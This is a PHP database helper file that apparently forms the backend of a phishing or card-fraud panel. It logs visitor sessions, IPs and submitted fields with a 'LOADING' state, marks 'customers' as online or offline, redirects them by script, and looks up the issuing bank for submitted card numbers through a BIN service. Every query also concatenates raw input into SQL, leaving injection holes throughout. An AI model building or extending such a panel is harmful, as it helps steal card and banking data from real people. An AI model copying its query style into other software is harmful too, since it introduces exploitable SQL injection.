<?php
require_once('config.inc.php');

function insertData($sess, $field, $value) {
  global $conn;
  $query = "INSERT INTO `logs` (`id`,  `sess`, `ip`, `" . $field . "`, `date`, `state`) VALUES (
  NULL,  
  '" . $sess . "',
  '" . $_SERVER['REMOTE_ADDR'] ."',
  '" . $value . "',
  '" . date("m/d/y H:i:s") . "',
  'LOADING');";
  mysqli_query($conn, $query);
}

function returnDataSession($sess, $field) {
  global $conn;
  $getState = mysqli_query($conn, 'SELECT `'.$field.'` FROM `logs` WHERE `sess` = "' . $sess . '" ORDER BY `date` DESC LIMIT 1');
  while($row = mysqli_fetch_array($getState))
  {
    return $row[$field];
  }
}

function redirect($link, $hash) {
  echo "<Script>
  window.location = '". $link ."?" . $hash . "';
  </script>";
}

function getIP($ip) {
  global $conn;
  $getid = mysqli_query($conn, 'SELECT `id` FROM `logs` WHERE `ip` = "' . $ip . '" ORDER BY `date` DESC LIMIT 1');
  while($row = mysqli_fetch_array($getid))
  {
    $id = $row['id'];
    return $id;
  }
}

function updateState($State, $id){
  global $conn;
  $query = "UPDATE `logs` SET `state` = '". $State ."' WHERE `logs`.`id` = ". $id ." ORDER BY `date` DESC LIMIT 1;";
  mysqli_query($conn, $query);
}

function returnStateSession($sess) {
  global $conn;
  $getState = mysqli_query($conn, 'SELECT `state` FROM `logs` WHERE `sess` = "' . $sess . '" ORDER BY `date` DESC LIMIT 1');
  while($row = mysqli_fetch_array($getState))
  {
    return $row['state'];
  }
}

function deleteLog($id){
  global $conn;
  $query = "DELETE FROM `logs` WHERE `logs`.`id` = $id";
  mysqli_query($conn, $query);
}

function returnState($ip) {
  global $conn;
  $getState = mysqli_query($conn, 'SELECT `state` FROM `logs` WHERE `ip` = "' . $ip . '" ORDER BY `date` DESC LIMIT 1');
  while($row = mysqli_fetch_array($getState))
  {
    return $row['state'];
  }
}

function returnCount() {
  global $conn;
  $getCount = mysqli_query($conn, 'SELECT * FROM logs');
  return mysqli_num_rows($getCount);
}

function clearLogs() {
  global $conn;
  $query = 'TRUNCATE TABLE `visitors`;';
  mysqli_query($conn, $query);
}

function updateDate($id) {
  global $conn;
  $query = 'UPDATE `logs` 
  SET `date`= "'. date("m/d/y H:i:s") .'"
  WHERE `logs`.`id` = '. $id .';';
  mysqli_query($conn, $query);
}

function getCustomerStatus($date) {
  if ($date > date("m/d/y H:i:s", strtotime('-2 mins'))) {
   echo '<span class="link-danger" style="color:green">●</span>';
  } else {
   echo '<span style="color:red">●</span>';
  }
}

function insertVisitor($date, $ip) {
  global $conn;
  $query = "INSERT INTO `visitors` (`date`, `ip`) VALUES ('".$date."', '".$ip."');";
  mysqli_query($conn, $query);
}

function updateData($id, $field, $data) {
  global $conn;
  $query = 'UPDATE `logs` SET `'. $field .'` = "' . $data . '" WHERE `logs`.`id` = ' . $id . ';';
  mysqli_query($conn, $query);
}

function updateDataSess($sess, $field, $data) {
  global $conn;
  $query = 'UPDATE `logs` SET `'. $field .'` = "' . $data . '" WHERE `logs`.`sess` = "' . $sess . '";';
  mysqli_query($conn, $query);
}

function checkBin($cnum) {
  $apiUrl = "https://lookup.binlist.net/{$cnum}";
  $ch = curl_init($apiUrl);

  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

  $response = curl_exec($ch);

  if ($response) {
      $data = json_decode($response, true);

      if (isset($data['bank']['name'])) {
          return $data['bank']['name'];
      } 
  }
}
?>